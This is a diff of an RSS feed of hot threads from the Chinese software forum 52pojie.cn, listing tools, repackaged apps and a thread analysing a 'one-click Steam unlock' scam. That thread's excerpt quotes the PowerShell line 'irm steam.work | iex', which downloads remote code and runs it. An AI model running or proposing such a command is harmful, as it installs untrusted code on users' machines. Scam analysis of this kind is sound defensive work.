@@ -4,12 +4,12 @@
 <title>吾爱破解 - 52pojie.cn - 导读 - 最新热门</title>
 <link>https://www.52pojie.cn/forum.php?mod=guide&amp;view=hot</link>
 
+
 <item>
 <title>央视影音v6.0.3.0绿色版</title>
 <link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1983903</link>
 <guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1983903</guid>
 <content:encoded><![CDATA[
-
 如有侵权，请版主删帖。
 如果不符发布区规则，麻烦请告知。
 
@@ -21,14 +21,12 @@
 绿色版 ...
 ]]></content:encoded>
 <pubDate>Wed, 20 Nov 2024 11:23:47 +0000</pubDate>
-<pubDate>Wed, 20 Nov 2024 11:23:47 +0000</pubDate>
 </item>
 <item>
 <title>Steam一键解锁游戏简单分析</title>
 <link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1983766</link>
 <guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1983766</guid>
 <content:encoded><![CDATA[
-
 [md]# Steam一键解锁游戏骗局分析
 
 steam通过powershell解锁游戏，感觉不简单
@@ -42,14 +40,12 @@ irm steam.work | iex
 1.`irm` 是 `Invoke-RestMethod` 的缩写，它用于发送 HTTP GET 请求到指定的 ...
 ]]></content:encoded>
 <pubDate>Wed, 20 Nov 2024 04:41:44 +0000</pubDate>
-<pubDate>Wed, 20 Nov 2024 04:41:44 +0000</pubDate>
 </item>
 <item>
 <title>PPT快速查重对比工具</title>
 <link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1982168</link>
 <guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1982168</guid>
 <content:encoded><![CDATA[
-
 PPT快速查重对比工具
 
 
@@ -59,9 +55,7 @@ Python实现的，没做界面。
 2、选择 ...
 ]]></content:encoded>
 <pubDate>Fri, 15 Nov 2024 07:12:55 +0000</pubDate>
-<pubDate>Fri, 15 Nov 2024 07:12:55 +0000</pubDate>
 </item>
-
 <item>
 <title>文件属性时间修改工具V1.1</title>
 <link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1983815</link>
@@ -14000,48 +13994,6 @@ https://justin1027.lanzoub.com/in ...
  ...
 ]]></content:encoded>
 <pubDate>Fri, 21 Jun 2024 07:17:40 +0000</pubDate>
-</item>
-<item>
-<title>批量视频去重剪辑+去水印解析下载，自定义剪辑方案</title>
-<link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1936271</link>
-<guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1936271</guid>
-<content:encoded><![CDATA[
-最近新学了ffmpeg技术，感觉捡到宝了，哈哈，之前做视频ban运，都是重复的视频处理工作。于是我决定写个脚本批量自动做去重剪辑，感觉效果还不错，发出来大家试试看。
-
-支持哪些剪辑操作？
-裁剪尺寸 + 画中画 + 背 ...
-]]></content:encoded>
-<pubDate>Wed, 19 Jun 2024 12:15:11 +0000</pubDate>
-</item>
-<item>
-<title>FastGestures 鼠标/触控板/屏手势  2.2.14</title>
-<link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1937850</link>
-<guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1937850</guid>
-<content:encoded><![CDATA[
-鼠标手势、手势快捷键、 激活/启动应用、发送快捷键、三指拖拽、快速搜索、执行命令行脚本、资源管理器导航、微信多开、图片OCR、Lua脚本、自定义扩展等！一款小而美的应用，支持 win7/8/10/11
-
-
-
-可以定义任何你想使 ...
-]]></content:encoded>
-<pubDate>Mon, 24 Jun 2024 22:29:23 +0000</pubDate>
-</item>
-<item>
-<title>闲来无事，写了一个简单的摸鱼工具</title>
-<link>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1937765</link>
-<guid>https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1937765</guid>
-<content:encoded><![CDATA[
-废话不多说，直接上代码。
-[mw_shl_code=python,true]import tkinter as tk
-from tkinter import ttk
-import pystray
-from PIL import Image
-import win32gui
-import win32process
-import win32con
-import psutil ...
-]]></content:encoded>
-<pubDate>Mon, 24 Jun 2024 10:24:46 +0000</pubDate>
 </item>
 </channel>
 </rss>
